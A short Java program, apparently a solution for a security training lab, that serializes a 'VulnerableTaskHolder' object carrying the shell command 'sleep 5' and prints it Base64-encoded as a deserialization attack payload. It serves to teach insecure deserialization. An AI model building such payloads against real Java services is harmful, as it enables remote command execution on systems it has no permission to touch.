package org.dummy.insecure.framework;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Program {
    public static void main(String[] args) throws IOException {
        final VulnerableTaskHolder malformed = new VulnerableTaskHolder(
                "whatever", "sleep 5");
        try (
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream)
        ) {
            objectOutputStream.writeObject(malformed);
            objectOutputStream.flush();
            final byte[] bytes = byteArrayOutputStream.toByteArray();
            final String hackedData = Base64.getEncoder().encodeToString(bytes);

            System.out.println(hackedData);
        }
    }
}
